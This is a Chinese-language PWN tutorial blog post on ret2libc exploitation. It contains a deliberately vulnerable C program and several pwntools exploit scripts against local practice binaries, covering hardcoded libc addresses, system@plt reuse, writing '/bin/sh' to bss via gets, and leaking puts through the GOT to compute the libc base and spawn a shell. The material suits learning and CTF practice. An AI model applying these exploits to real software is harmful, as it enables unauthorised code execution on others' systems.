---
title: 基本ROP-ret2libc实战
date: 2026-08-30 23:04:36
categories: PWN
---
    
## 实战0

自己手动编写一个简单的栈溢出漏洞程序
```c
#undef _FORTIFY_SOURCE  //用于取消glibc提供的fortify检查
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
  
void vulnerable_function()
{
    char buf[128];
    read(STDIN_FILENO, buf, 256);
} 

int main(int argc, char** argv)
{
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```
通过`ldd`命令查看程序需要的共享模块
```
$ ldd ret2libc
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib32/libc.so.6 (0xf7d75000)
        /lib/ld-linux.so.2 (0xf7fc9000)
```
可以看到，程序依赖的是libc.so.6这个共享模块，这个共享模块里面提供了大量可以利用的函数，我们的目的是执行system("/bin/sh")来打开shell，也就是说只要在libc中找到system()函数和"/bin/sh"字符串的地址就可以控制返回地址打开shell

### 1、找system()函数

因为关闭了ASLR（checksec可查），共享库的加载基址并不会发生改变，只要知道system()函数在共享库中的偏移就能够算出system()函数在内存中的地址。使用`objdump -T libc.so.6`命令就可以显示出所有的动态链接符号表
```
$ objdump -T /lib32/libc.so.6 | grep system
00167d20 g    DF .text  00000066 (GLIBC_2.0)  svcerr_systemerr
0004f8e0  w   DF .text  00000037  GLIBC_2.0   system
0004f8e0 g    DF .text  00000037  GLIBC_PRIVATE __libc_system
```
不难看出system()函数的偏移为0x0004f8e0，再加上ldd命令看到的基址0xf7d75000 + 0x0004f8e0 = 0xf7dc48e0，这个地址就是libc加载到内存空间后system()函数的真实地址

### 2、查找/bin/sh字符串

这里利用ROPgadget搜索/bin/sh字符串
```
$ ROPgadget --binary /lib32/libc.so.6 --string "/bin/sh"
Strings information
============================================================
0x001bcde8 : /bin/sh
```
同理计算基址+偏移量，0x0xf7d75000 + 0x001bcde8 = 0xf7f31de8，这里查找字符串的方法很多，也可以通过动调后search命令`search "/bin/sh" libc`查找

>[!info] gdb常用命令  
>- -q 参数不显示欢迎信息等  
>- -n 不加载任何插件，使用原生gdb  
>- info 后面跟想要查看的具体信息，如函数信息info functions  
>- b/breakpoint 设置断点  
>- del/delete breakpoints n 删除断点，n是断点编号，可用info breakpoints命令查看断点信息  
>- start 命令启动程序并停在开辟完主函数栈帧的地方  
>- c/continue 继续执行程序，遇到断点停下  
>- f/finish 结束程序  
>- r/run 运行程序，遇到断点停下  
>- ni 单步步过，一步一步执行指令遇到函数调用时直接执行完整个函数  
>- si 单步步入，一步一步执行指令遇到函数调用时跳转到函数内部  
>- vmmap 查看内存映射  
>- checksec 查看程序的防护措施  
>- pdisass/disassemble 查看当前函数帧的反汇编代码，前一个命令有高亮显示只是需要安装pwndbg插件，后一个命令gdb自带命令无高亮显示  
>- p/print 打印信息，如寄存器`p $ebp`  
>- x/<n/f/u>\<addr>查看某地址处的值，n/f/u参数可选，n代表想要查看多少个内存单元即从当前地址开始计算，每个内存单元的大小由后面的u参数指定；f表示显示格式，如s表示字符串形式，i为指令形式；u指定内存单元大小，b（一字节）、h（双字节）、w（四字节）、g（八字节）默认为w；后面跟上x代表以十六进制的形式查看变量
>- set *addr = value 设置某个地址的值

### 3、覆盖返回地址

找到system()函数和"/bin/sh"字符串地址后，我们接下来就该确定返回地址在哪儿了，同样是利用cyclic确定无效地址报错位置为0x6261616b，再利用`cyclic -l`查出返回地址与缓冲区的偏移140

### 4、构造payload

payload = 'a' * 140 + system_addr + system_ret_addr + binsh_addr  
main返回地址处放置system()函数的地址使当前函数运行完毕时跳转到system()函数处继续执行，<mark style="background: #FF5582A6;">函数的调用过程是先参数入栈，接着保存返回地址，最后call system</mark>。system_ret_addr是system()函数的返回地址，因为我们的目的就是打开shell，所以这个返回地址随便设置一个值即可，binsh_addr放置的是参数"/bin/sh"字符串的地址

### 5、编写exp

```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')
  
p = process('./ret2libc')

system_addr = 0xf7dc48e0
system_ret_addr = 0x1
binsh_addr = 0xf7f31de8

payload = b'a' * 140 + p32(system_addr) + p32(system_ret_addr) + p32(binsh_addr)

p.sendline(payload)
  
p.interactive()
```

### 理解难点

Filler就是system_ret_addr这个地方，即system函数地址和"/bin/sh"地址之间，之所以称呼其为filler，是因为这个地方只用做填充以正常结束函数调用过程
- 为什么我们说Filler可以随便填写？  
<mark style="background: #FF5582A6;">当CPU执行call指令时会进行两步操作：①将函数返回地址入栈 ②跳转</mark>  
所以CPU在执行ret指令时只需要恢复eip寄存器即可，因此ret指令的含义是call指令执行前的下一条指令地址赋值给eip寄存器  
但是，<mark style="background: #FF5582A6;">由于我们使用system函数的地址替换了原本的eip寄存器，强制执行system函数，破坏了程序的栈帧分配和释放策略，所以后续的操作必须基于这个被破坏的栈帧结构实现</mark>
- 为什么Filler是函数的返回地址？  
正常情况下，我们是通过call指令进行函数调用的，因此在进入到system函数前，call指令已经将返回地址push到栈帧中了，所以在正常情况下ret指令就是pop之前call指令push到栈帧的数据，也就是说二者是成对的。但是！<mark style="background: #FF5582A6;">在ret2libc中，直接通过覆盖eip地址跳转到了system函数，而并没有经过call调用，也就是没有push eip的操作，但是system函数却照常进行了ret指令的pop eip操作。那么这个ret指令pop到eip的是哪一处地址呢？自然就是Filler</mark>
- 为什么传递给system函数的参数紧跟在Filler后？  
因为我们强制更改了调用过程，<mark style="background: #FF5582A6;">省去了call调用的push步骤，因此Filler成为了ret后的EIP</mark>。但是，我们仅是省去了push这一步而已，其他步骤与正常函数调用并无区别，所以如果我们将Filler看作是保存的返回地址的话，那么它之后的数据自然就成为了system函数的参数了

## 实战1

checksec查看保护  
{% asset_img Pasted_image_20260831004718.png %}  
ida静态分析  
{% asset_img Pasted_image_20260831004836.png %}  
gets函数栈溢出，cyclic测算溢出长度为112  
利用ROPgadget查看是否存在/bin/sh  
{% asset_img Pasted_image_20260831005136.png %}  
查找一下是否存在system函数  
{% asset_img Pasted_image_20260831005903.png %}  
secure函数调用了system函数，在程序链接时会为system()生成plt和got项，第一次调用函数时，会把函数真实的地址写入got表，所以我们可以直接覆盖函数返回地址使其调用system()@plt模拟system()函数真实调用  
编写payload
```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')  

p = process('./pwn1') 

system_plt = 0x08048460
binsh_addr = 0x08048720

payload = flat(['a' * 112, system_plt, 'a' * 4, binsh_addr])

p.sendline(payload) 

p.interactive()
```

## 实战2

checksec检查文件保护机制  
{% asset_img Pasted_image_20260906135533.png %}  
ida静态分析  
{% asset_img Pasted_image_20260906135657.png %}  
发现危险函数gets()函数，cyclic测量溢出长度为112  
利用ROPgadget发现程序中并没有/bin/sh字符串  
{% asset_img Pasted_image_20260906140316.png %}  
但是我们在bss段中可以找到一些能够供我们利用的空间  
{% asset_img Pasted_image_20260906140727.png %}  
然后我们能在secure函数中找到system()函数的调用  
{% asset_img Pasted_image_20260906140808.png %}  
编写exp
```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug') 

p = process('./pwn2')

sys_plt = 0x08048490
bss_addr = 0x0804A080
gets_plt = 0x08048460
  
payload = b'a' * 112 + p32(gets_plt) + p32(sys_plt) + p32(bss_addr) + p32(bss_addr)

p.sendline(payload)
p.sendline('/bin/sh')

p.interactive()
```

解析payload：  
首先利用112字节的a发生栈溢出；接着通过gets函数的.plt地址覆盖返回地址，执行gets函数，参数为bss段地址，目的是通过gets函数将'/bin/sh'写入bss段中；然后使用system函数覆盖gets函数返回地址，执行system函数，参数为bss段地址，也就是我们刚通过gets函数写入的'/bin/sh'，最后通过sendline手动写入'/bin/sh'到bss段上

## 实战3

检查文件保护  
{% asset_img Pasted_image_20260906204336.png %}  
ida静态分析  
{% asset_img Pasted_image_20260906204528.png %}  
gets函数栈溢出，这次既没有'/bin/sh'字符串又没有system函数，cyclic测算出栈溢出为112字节  
所以我们现在的首要任务便是找到system函数的地址，我们利用了两个知识点：
- system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的
- 即使程序有ASLR保护，也仅仅针对于地址中间位进行随机，最低的12位并不会发生改变  
所以我们只要知道libc的版本，就可以知道system函数地址和'/bin/sh'的偏移量。知道偏移后，再加上libc的基地址，就可以知道system函数的真实地址
>libc基地址 + 函数偏移量 = 函数真实地址  

那么问题就来到了我们该如何寻找libc的基地址。我们可以泄露一个函数的真实地址，然后根据公式可以得到libc的基地址。那么我们该如何泄露函数的真实地址呢，这里就涉及到了libc的<mark style="background: #FF5582A6;">延迟绑定技术</mark>。
>[!note] 个人理解简析PLT表与GOT表  
>首先我们需要知道一个笼统的概念：函数在被调用时会先进入PLT表，读取PLT表中存放着的跳转代码，跳转到GOT表中的对应位置，而GOT表中存放着全局变量(.got)和函数地址(.got.plt)，通过这个地址执行函数。所以PLT表和GOT表是有这么一个链接关系的。而***PLT表与GOT表的链接关系在编译阶段就已经确定***  
>
>接下来我们详细解析一下PLT表和GOT表中的内容：
>- PLT表：
>    - PLT表的开头为PLT[0] - 公共解析入口。简单来说这里存放着两条调用动态链接器的代码，而<mark style="background: #FF5582A6;">动态链接器的作用就是找到对应函数的真实地址并将其写入对应GOT表位置，然后再直接jmp跳转到函数真实地址执行调用</mark>
>    - 之后便是各函数的PLT表项。而每个函数的PLT表项都有三条代码，分别是跳转到对应GOT表项的跳转代码(`jmp ds:off_XXXXXXXX`)、重定位索引(`push n`)、 跳转到公共解析入口的跳转代码(`jmp PLT[0]`)  
>- GOT表：
>    - 在函数**第一次被调用**时，<mark style="background: #FF5582A6;">GOT表项中存放着PLT解析代码的地址，即PLT表项中第二条指令的地址</mark>，我们知道PLT表中第二、三条指令的作用是调用动态链接器找到对应函数的真实地址并将其写入对应GOT表位置，再直接jmp函数真实地址执行调用（重定位索引的作用就是让动态链接库知道我们需要查找哪个函数，和找到函数地址后应该填入GOT表中的哪个位置）
>    - 而函数后续再被调用时，GOT表中存放着的便是函数真实地址了，我们会直接跳转到函数真实地址执行调用  

其中，第一次调用函数时动态链接器查找函数真实地址并写入GOT表的行为就叫做<mark style="background: #FF5582A6;">延迟绑定技术</mark>。我们要泄露函数的真实地址，<mark style="background: #FF5582A6;">一般的方法是采用GOT表泄露，因为只要之前执行过puts函数，GOT表里存放着的就是函数的真实地址，我们得到地址后将其作为参数传递给puts函数，就可以将这个地址中的数据输出出来，达到泄露函数真实地址的目的</mark>
```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

p = process('./pwn3')
elf = ELF('./pwn3')

puts_got_addr = elf.got['puts'] #得到puts函数的GOT表地址，真实地址存放的位置
puts_plt_addr = elf.plt['puts'] #得到puts函数的PLT表地址，用以调用puts函数
main_addr = elf.symbols['_start'] #最后将返回地址覆盖为main函数地址，使程序还可被溢出

payload = b'a' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)

p.recv() #从目标程序接收数据，这里的作用是等待程序启动完成，确保程序已经准备好接收输入
p.sendline(payload)

puts_addr = u32(p.recv()[0:4]) #将地址输出以后用32位解包，这里的recv()则是接收puts函数打印出来的真实地址
print("puts_addr = ", hex(puts_addr))
```
运行脚本得到puts函数的真实地址0xf7d568d0  
{% asset_img Pasted_image_20260906214451.png %}  
我们根据函数的真实地址便可以查到libc版本。ASLR技术虽然可以地址随机化，但是低十二位是不变的（需要内存页对齐），puts函数的真实地址0xf7d568d0的低十二位8d0，然后就可以根据这低十二位查到libc版本，接着即可算出libc加载的基址  
我们可以通过libc-database这个工具查找libc版本以及关键函数字符串的偏移量  
编写exp
```python
from pwn import *
  
context(arch = 'i386', os = 'linux', log_level = 'debug')

p = process('./pwn3')
elf = ELF('./pwn3')

puts_got_addr = elf.got['puts'] #得到puts函数的GOT表地址，真实地址存放的位置
puts_plt_addr = elf.plt['puts'] #得到puts函数的PLT表地址，用以调用puts函数
main_addr = elf.symbols['_start'] #最后将返回地址覆盖为main函数地址，使程序还可被溢出

print("puts_got_addr = ", hex(puts_got_addr))
print("puts_plt_addr = ", hex(puts_plt_addr))
print("main_addr = ", hex(main_addr))

payload = b'a' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)

p.recv() #从目标程序接收数据，这里的作用是等待程序启动完成，确保程序已经准备好接收输入
p.sendline(payload)

puts_addr = u32(p.recv()[0:4]) #将地址输出以后用32位解包，这里的recv()则是接收puts函数打印出来的真实地址
print("puts_addr = ", hex(puts_addr))

sys_offset = 0x4f8e0
puts_offset = 0x768d0
binsh_offset = 0x1bcde8

libc_base_addr = puts_addr - puts_offset #计算libc基地址
sys_addr = libc_base_addr + sys_offset
binsh_addr =libc_base_addr + binsh_offset

print("libc_base_addr = ", hex(libc_base_addr))
print("sys_addr = ", hex(sys_addr))
print("binsh_addr = ", hex(binsh_addr))

payload = b'a' * 112 + p32(sys_addr) + b'a' * 4 + p32(binsh_addr)

p.sendline(payload)
p.interactive()
```

总结一下思路：
1. 泄露puts函数的真实地址
2. 查找libc版本
3. 找到system函数、puts函数和/bin/sh字符串的偏移量，计算出libc基地址
4. 计算system函数和/bin/sh的真实地址
5. 构造payload，执行system('/bin/sh')
6. 编写exp
